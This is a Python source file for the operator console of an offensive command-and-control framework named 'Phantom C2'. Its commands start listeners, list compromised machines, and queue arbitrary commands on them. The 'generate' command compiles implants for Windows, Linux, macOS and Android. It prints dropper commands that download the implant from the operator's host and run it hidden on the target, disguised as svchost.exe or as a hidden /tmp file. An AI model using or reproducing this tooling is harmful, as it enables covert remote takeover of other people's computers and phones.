import cmd
import sys
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from datetime import datetime

from phantom.core.c2_server import server_instance, c2_state
from phantom.utils.notifier import notifier

console = Console()

def build_c2_banner():
    return r"""
[bold magenta]
  ██████╗██████╗     ██████╗ ██████╗ ██████╗ ███████╗
 ██╔════╝╚════██╗   ██╔════╝██╔═══██╗██╔══██╗██╔════╝
 ██║      █████╔╝   ██║     ██║   ██║██████╔╝█████╗  
 ██║     ██╔═══╝    ██║     ██║   ██║██╔══██╗██╔══╝  
 ╚██████╗███████╗██╗╚██████╗╚██████╔╝██║  ██║███████╗
  ╚═════╝╚══════╝╚═╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝
[/bold magenta]
  [dim]──────────────────────────────────────────────────────────[/dim]
  [bold magenta]Phantom C2 Operations Center[/bold magenta]  [dim]v1.0.0[/dim]
  [dim]Secure Encrypted Asynchronous Communications[/dim]
"""

class C2Shell(cmd.Cmd):
    intro = ""
    prompt = "\033[1;35mC2\033[0m > "

    def __init__(self):
        super().__init__()
        self.active_beacon = None

    def preloop(self):
        console.print(build_c2_banner())
        notifier.status("C2 Shell initialized. Type 'help' for commands.")

    def postcmd(self, stop, line):
        if self.active_beacon:
            self.prompt = f"\033[1;35mC2\033[0m (\033[36m{self.active_beacon}\033[0m) > "
        else:
            self.prompt = "\033[1;35mC2\033[0m > "
        return stop

    def do_listeners(self, arg):
        """listeners [start <port> | stop]"""
        parts = arg.split()
        if not parts:
            if server_instance.thread and server_instance.thread.is_alive():
                console.print(f"[*] Listener [green]ACTIVE[/green] on port {server_instance.port}")
            else:
                console.print("[*] Listener [red]INACTIVE[/red]")
            return

        action = parts[0]
        if action == "start":
            port = int(parts[1]) if len(parts) > 1 else 443
            server_instance.port = port
            server_instance.start()
            notifier.success(f"Started listener on port {port}")
        elif action == "stop":
            server_instance.stop()
            notifier.success("Stopped listener")
        else:
            notifier.error("Usage: listeners [start <port> | stop]")

    def do_beacons(self, arg):
        """beacons - list active beacons"""
        beacons = c2_state.get_beacons()
        if not beacons:
            notifier.warn("No active beacons.")
            return

        table = Table(title="Active Beacons", border_style="magenta")
        table.add_column("ID", style="cyan")
        table.add_column("Source IP", style="green")
        table.add_column("Local IPs", style="dim green")
        table.add_column("User@Host", style="magenta")
        table.add_column("OS", style="blue")
        table.add_column("Last Seen", style="yellow")
        
        for bid, info in beacons.items():
            user = info.get("user", "")
            host = info.get("hostname", "")
            user_host = f"{user}@{host}" if user or host else "Unknown"
            
            os_arch = info.get("os", "Unknown")
            if "arch" in info:
                os_arch += f" ({info['arch']})"
                
            local_ips = info.get("local_ips", "")
            if len(local_ips) > 20: local_ips = local_ips[:17] + "..."
            
            table.add_row(
                bid, 
                info.get("ip", "Unknown"), 
                local_ips,
                user_host,
                os_arch,
                info.get("last_seen", "Never")
            )
            
        console.print(table)

    def do_interact(self, arg):
        """interact <beacon_id> - drop into beacon interaction mode"""
        bid = arg.strip()
        beacons = c2_state.get_beacons()
        if not bid or bid not in beacons:
            notifier.error("Invalid or missing Beacon ID.")
            return
        
        self.active_beacon = bid
        notifier.success(f"Interacting with beacon {bid}")

    def do_back(self, arg):
        """back - return to main C2 shell from interaction mode"""
        if self.active_beacon:
            self.active_beacon = None
            notifier.success("Returned to global C2 context.")
        else:
            notifier.warn("Already in global context.")

    def default(self, line):
        """Execute a command on the active beacon"""
        if not self.active_beacon:
            notifier.error("No active beacon. Use 'interact <beacon_id>' first.")
            return

        # Queue the task
        task_id = c2_state.queue_task(self.active_beacon, line)
        notifier.info(f"Task queued. ID: {task_id}")

    def do_results(self, arg):
        """results - show results for the active beacon"""
        if not self.active_beacon:
            notifier.error("No active beacon. Use 'interact <beacon_id>' first.")
            return

        results = c2_state.get_results(self.active_beacon)
        if not results:
            notifier.warn("No results available for this beacon.")
            return

        for res in results:
            console.print(f"\n[bold cyan]--- Result for Task: {res['task_id']} ---[/]")
            console.print(res["output"])

    def do_generate(self, arg):
        """generate [windows|linux|macos|android] - Generate beacon and dropper for a target platform"""
        import os, subprocess, shutil
        from phantom.utils.network import get_lhost
        from phantom.core.session import session
        
        # Try to guess platform if not provided
        platform = arg.strip().lower()
        if not platform:
            # Check scan results for OS clues
            scan_res = session.get_result("scan") or {}
            all_text = str(scan_res).lower()
            if "linux" in all_text or "unix" in all_text:
                platform = "linux"
                notifier.info("Detected Linux target from scan results. Defaulting to 'linux'.")
            elif "windows" in all_text:
                platform = "windows"
                notifier.info("Detected Windows target from scan results. Defaulting to 'windows'.")
            else:
                platform = "windows" # Global default
        
        valid_platforms = ["windows", "linux", "macos", "android"]
        if platform not in valid_platforms:
            notifier.error(f"Invalid platform. Choose from: {', '.join(valid_platforms)}")
            return
        
        import phantom
        pkg_root = os.path.dirname(phantom.__file__)
        beacon_dir = os.path.join(pkg_root, "payloads", "beacon")
        host = get_lhost()
        port = server_instance.port if (server_instance.thread and server_instance.thread.is_alive()) else 443
        
        if platform == "windows":
            beacon_out = os.path.join(beacon_dir, "beacon.exe")
            if not os.path.exists(beacon_out):
                console.print("[yellow][*] Compiling beacon for Windows...[/yellow]")
                try:
                    if os.name == 'nt':
                        if not shutil.which("cl"):
                            notifier.error("'cl.exe' (MSVC) not found in PATH. Run from Developer Command Prompt or install Build Tools.")
                            return
                        subprocess.run(
                            ["cl", "/EHsc", "/O2", "/std:c++17", "src/main.cpp", "/Fe:beacon.exe",
                             "/link", "winhttp.lib", "bcrypt.lib", "ws2_32.lib", "/SUBSYSTEM:WINDOWS"],
                            cwd=beacon_dir, check=True, capture_output=True, text=True)
                    else:
                        mingw_cpp = "x86_64-w64-mingw32-g++"
                        if not shutil.which(mingw_cpp):
                            notifier.error(f"'{mingw_cpp}' not found. To build for Windows from Linux, run:")
                            console.print(f"[bold cyan]    sudo apt update && sudo apt install -y mingw-w64[/]")
                            return
                        subprocess.run(
                            [mingw_cpp, "-std=c++17", "-O2", "-s", "-o", "beacon.exe",
                             "src/main.cpp", "-lwinhttp", "-lbcrypt", "-lws2_32", "-static"],
                            cwd=beacon_dir, check=True, capture_output=True, text=True)
                    notifier.success("Windows beacon compiled.")
                except subprocess.CalledProcessError as e:
                    notifier.error(f"Compilation failed:\n{e.stderr}")
                    return
                except Exception as e:
                    notifier.error(f"Unexpected error: {e}")
                    return
            
            url = f"http://{host}:{port}/api/v1/payload"
            dropper = f"Invoke-WebRequest -Uri {url} -OutFile $env:TEMP\\svchost.exe; Start-Process $env:TEMP\\svchost.exe -ArgumentList '{host} {port}' -WindowStyle Hidden"
            console.print(Panel(dropper, title="[bold green]PowerShell Dropper (Windows)[/]", border_style="green"))
        
        elif platform == "linux":
            beacon_out = os.path.join(beacon_dir, "beacon_linux")
            if not os.path.exists(beacon_out):
                console.print("[yellow][*] Compiling beacon for Linux...[/yellow]")
                try:
                    if not shutil.which("g++"):
                        notifier.error("'g++' not found. Install build-essential, libcurl4-openssl-dev, and libssl-dev:")
                        console.print("[bold cyan]    sudo apt update && sudo apt install -y build-essential libcurl4-openssl-dev libssl-dev[/]")
                        return
                    subprocess.run(
                        ["g++", "-std=c++17", "-O2", "-s", "-o", "beacon_linux", "src/main.cpp",
                         "-lcurl", "-lssl", "-lcrypto", "-lpthread"],
                        cwd=beacon_dir, check=True, capture_output=True, text=True)
                    notifier.success("Linux beacon compiled.")
                except subprocess.CalledProcessError as e:
                    notifier.error(f"Compilation failed:\n{e.stderr}")
                    return
                except Exception as e:
                    notifier.error(f"Unexpected error: {e}")
                    return
            
            url = f"http://{host}:{port}/api/v1/payload_linux"
            dropper = f"curl -s {url} -o /tmp/.phantom && chmod +x /tmp/.phantom && nohup /tmp/.phantom {host} {port} &>/dev/null &"
            console.print(Panel(dropper, title="[bold cyan]Bash Dropper (Linux)[/]", border_style="cyan"))
        
        elif platform == "macos":
            beacon_out = os.path.join(beacon_dir, "beacon_macos")
            if not os.path.exists(beacon_out):
                console.print("[yellow][*] Compiling beacon for macOS...[/yellow]")
                try:
                    if not shutil.which("clang++"):
                        notifier.error("'clang++' not found. Install Xcode Command Line Tools.")
                        return
                    subprocess.run(
                        ["clang++", "-std=c++17", "-O2", "-o", "beacon_macos", "src/main.cpp",
                         "-lcurl", "-lssl", "-lcrypto", "-lpthread", "-framework", "CoreGraphics"],
                        cwd=beacon_dir, check=True, capture_output=True, text=True)
                    notifier.success("macOS beacon compiled.")
                except subprocess.CalledProcessError as e:
                    notifier.error(f"Compilation failed:\n{e.stderr}")
                    console.print("[dim]Ensure Xcode Command Line Tools, curl, and openssl are installed.[/dim]")
                    return
                except Exception as e:
                    notifier.error(f"Unexpected error: {e}")
                    return
            
            url = f"http://{host}:{port}/api/v1/payload_macos"
            dropper = f"curl -s {url} -o /tmp/.phantom && chmod +x /tmp/.phantom && nohup /tmp/.phantom {host} {port} &>/dev/null &"
            console.print(Panel(dropper, title="[bold yellow]Bash Dropper (macOS)[/]", border_style="yellow"))
        
        elif platform == "android":
            beacon_out = os.path.join(beacon_dir, "beacon_android")
            if not os.path.exists(beacon_out):
                console.print("[yellow][*] Compiling beacon for Android (ARM64)...[/yellow]")
                ndk_cc = os.environ.get("ANDROID_NDK_CC", "aarch64-linux-android28-clang++")
                if not shutil.which(ndk_cc):
                    notifier.error(f"Android NDK compiler '{ndk_cc}' not found. Set ANDROID_NDK_CC.")
                    return
                try:
                    subprocess.run(
                        [ndk_cc, "-std=c++17", "-O2", "-s", "-o", "beacon_android", "src/main.cpp",
                         "-lcurl", "-lssl", "-lcrypto", "-static"],
                        cwd=beacon_dir, check=True, capture_output=True, text=True)
                    notifier.success("Android beacon compiled.")
                except subprocess.CalledProcessError as e:
                    notifier.error(f"Compilation failed:\n{e.stderr}")
                    console.print("[dim]Ensure Android NDK is installed and ANDROID_NDK_CC is set correctly.[/dim]")
                    return
                except Exception as e:
                    notifier.error(f"Unexpected error: {e}")
                    return
            
            url = f"http://{host}:{port}/api/v1/payload_android"
            dropper = f"curl -s {url} -o /data/local/tmp/.phantom && chmod +x /data/local/tmp/.phantom && /data/local/tmp/.phantom {host} {port} &"
            console.print(Panel(dropper, title="[bold red]ADB Dropper (Android)[/]", border_style="red"))
        
        notifier.info("Run the above command on the target to deploy the beacon.")

    def do_exit(self, arg):
        """exit - Close C2 and return to main Phantom CLI (or exit completely)"""
        console.print("[dim]Stopping listener...[/]")
        server_instance.stop()
        return True

    def do_quit(self, arg):
        return self.do_exit(arg)

def run_c2():
    try:
        shell = C2Shell()
        shell.cmdloop()
    except KeyboardInterrupt:
        print()
        server_instance.stop()
